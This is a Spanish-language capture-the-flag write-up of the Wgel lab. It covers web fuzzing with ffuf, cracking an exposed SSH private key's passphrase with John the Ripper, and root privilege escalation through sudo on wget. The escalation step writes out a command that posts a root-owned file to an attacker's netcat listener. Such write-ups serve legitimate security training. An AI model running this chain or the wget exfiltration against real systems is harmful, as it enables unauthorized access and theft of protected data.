# Wgel CTF

## 🖥️ Sistema

Linux

---

## 🎯 Objetivo del laboratorio

Comprometer una máquina Linux mediante la exposición de una **clave privada SSH**, obtener acceso inicial descifrando su passphrase y escalar privilegios aprovechando una mala configuración de **sudo** sobre el binario `wget` para exfiltrar información protegida.

---

## 🛠️ Tecnologías trabajadas

- FFUF
- SSH
- John The Ripper
- ssh2john
- Sudo
- Wget
- GTFOBins

---

## 🧠 Metodología

La enumeración inicial mostró únicamente dos servicios expuestos: **SSH** y **HTTP**, por lo que la aplicación web se convirtió en el principal punto de investigación.

Mientras realizaba una revisión manual del sitio lancé un proceso de fuzzing para descubrir directorios ocultos. La combinación de ambas técnicas permitió identificar tanto un posible usuario del sistema como un nuevo directorio desde el que continuar la enumeración.

El segundo proceso de fuzzing reveló un directorio `.ssh` accesible públicamente que contenía una **clave privada SSH**. Aunque estaba protegida mediante passphrase, podía descargarse y crackearse localmente utilizando **John The Ripper**, permitiendo así el acceso inicial al sistema.

Una vez dentro, la revisión de privilegios mostró que el usuario podía ejecutar `wget` como **root** mediante `sudo`. En lugar de utilizar una shell privilegiada, aproveché una técnica documentada en **GTFOBins** para exfiltrar directamente el contenido del archivo protegido desde el sistema comprometido hacia la máquina atacante.

Este laboratorio demuestra cómo una mala configuración de permisos y una exposición accidental de archivos sensibles pueden comprometer completamente un servidor.

---

## 🚀 Explotación

### 1. Enumeración inicial

Comencé realizando un escaneo con **ReconX**.

Los servicios identificados fueron:

| Puerto | Servicio |
|---------|----------|
| 22 | SSH |
| 80 | HTTP |

Al no existir otros servicios expuestos, la investigación se centró completamente en la aplicación web.

---

### 2. Enumeración web

Mientras inspeccionaba manualmente el sitio ejecuté un fuzzing de directorios.

```bash
ffuf -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/raft-medium-directories.txt -u http://10.128.160.18/FUZZ
```

Durante la revisión del código fuente encontré el siguiente comentario:

```
jessie
```

Este nombre parecía corresponder a un usuario del sistema.

El fuzzing devolvió un directorio especialmente interesante:

```
sitemap
```

---

### 3. Enumeración del directorio `sitemap`

Continué la enumeración sobre el nuevo recurso descubierto.

```bash
ffuf -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/common.txt -u http://10.128.160.18/sitemap/FUZZ
```

Entre los resultados destacaban:

- `.hta`
- `.htpasswd`
- `.htaccess`
- `.ssh`

El directorio `.ssh` resultó especialmente relevante.

Al acceder a él encontré el archivo:

```
id_rsa
```

Se trataba de una clave privada SSH protegida mediante una passphrase.

---

### 4. Obtención del acceso inicial

Descargué la clave privada y la preparé para su crackeo utilizando **John The Ripper**.

Convertí la clave al formato compatible.

```bash
ssh2john id_rsa > hash.txt
```

Posteriormente lancé el ataque.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Una vez recuperada la passphrase, ajusté los permisos del archivo.

```bash
chmod 600 id_rsa
```

Finalmente inicié sesión mediante SSH.

```bash
ssh -i id_rsa jessie@10.128.160.18
```

Con ello obtuve acceso al sistema como el usuario **jessie**.

---

### 5. Post-explotación

Una vez dentro busqué la primera flag.

```bash
find / -name "*user*.txt" 2>/dev/null
```

Tras localizar el archivo correspondiente recuperé su contenido.

```bash
cat user.txt
```
---

### 6. Escalada de privilegios

Comencé revisando los permisos disponibles mediante `sudo`.

```bash
sudo -l
```

El resultado mostró:

```text
(root) NOPASSWD: /usr/bin/wget
```

Consultando **GTFOBins** comprobé que `wget` podía utilizarse para enviar archivos protegidos mediante una petición HTTP.

En lugar de obtener una shell como **root**, preparé un listener en la máquina atacante.

```bash
nc -lvnp 1234
```

Desde la máquina comprometida ejecuté:

```bash
sudo /usr/bin/wget --post-file=/root/root_flag.txt http://192.168.131.12:1234
```

El contenido del archivo fue enviado directamente al listener de Netcat.

De esta forma recuperé la flag sin necesidad de acceder directamente al directorio `/root`.

---

## 📚 Lecciones aprendidas

- Este laboratorio permitió practicar una cadena de explotación basada en una mala exposición de archivos sensibles y una configuración insegura de `sudo`.
- Combinar enumeración manual y fuzzing para descubrir recursos ocultos.
- Identificar información útil dentro del código fuente de una aplicación web.
- Localizar directorios sensibles como `.ssh` expuestos públicamente.
- Convertir claves privadas mediante `ssh2john`.
- Recuperar passphrases utilizando **John The Ripper**.
- Acceder a un sistema autenticándose mediante una clave privada SSH.
- Aprovechar **GTFOBins** para utilizar `wget` como herramienta de exfiltración.
- Comprender que la escalada de privilegios no siempre requiere obtener una shell como **root**.
